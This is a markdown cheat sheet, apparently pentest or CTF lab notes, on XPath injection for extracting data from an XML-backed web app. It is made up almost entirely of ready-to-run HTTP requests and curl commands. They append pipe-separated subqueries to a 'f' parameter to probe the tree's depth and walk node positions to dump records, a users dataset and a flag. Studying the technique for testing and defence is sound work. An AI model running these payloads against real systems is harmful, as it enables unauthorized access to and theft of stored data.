# XPath - Advanced Data Exfiltration

When the application limits results (e.g., shows only first N matches), dump the XML by iterating: first discover schema depth, then walk positions.

## 1) Force empty original, append probing subquery

Set a term that returns no hits (e.g., `q=SOMETHINGINVALID`) and use `f=<original>|/*[1]` to probe from root.

```http
GET /index.php?q=SOMETHINGINVALID&f=fullstreetname | /*[1] HTTP/1.1
Host: <host>
```

- If the app expects a string and your subquery yields a node-set/array, output may be blank.
- Increase depth until output changes to find the data subtree depth:
  - `/*[1]` → nothing
  - `/*[1]/*[1]` → nothing
  - `/*[1]/*[1]/*[1]` → nothing
  - `/*[1]/*[1]/*[1]/*[1]` → first visible value

## 2) Walk positions at the last level

Once depth `D` is found, iterate `/*[k]` at the last step to enumerate fields/children, then move leftwards to enumerate records.

Example (depth=4):

- `/*[1]/*[1]/*[1]/*[1]` → first item field 1
- `/*[1]/*[1]/*[1]/*[2]` → first item field 2
- `/*[1]/*[1]/*[1]/*[3]` → first item field 3
- Increment the penultimate index to move to item 2, repeat.

## Curl Cheat-Sheet

```bash
# Depth probing from root (encode | as %7C)
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]"

# Try deeper
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]/*[1]"
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]/*[1]/*[1]"
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]/*[1]/*[1]/*[1]"

# Enumerate fields of the first record (last index)
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]/*[1]/*[1]/*[1]"
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]/*[1]/*[1]/*[2]"
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]/*[1]/*[1]/*[3]"

# Move to the second record (increment penultimate index)
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]/*[1]/*[2]/*[1]"
```

## Example Targeting a Different Dataset

If the second top-level child holds another dataset (e.g., users), start at `/*[1]/*[2]` and repeat depth probing:

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]/*[2]"
curl "http://<SERVER_IP>:<PORT>/index.php?q=SOMETHINGINVALID&f=fullstreetname%7C/*[1]/*[2]/*[1]/*[1]/*[1]"
```

## Concrete lab-style locator

If the flag is at `/*[1]/*[2]/*[3]/*[1]/*[3]`:

```http
q=INVALID&f=fullstreetname|/*[1]/*[2]/*[3]/*[1]/*[3]
```

Encoded curl:

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?q=INVALID&f=fullstreetname%7C/*[1]/*[2]/*[3]/*[1]/*[3]"
```

> Redact secrets/flags in notes; store them separately if needed.
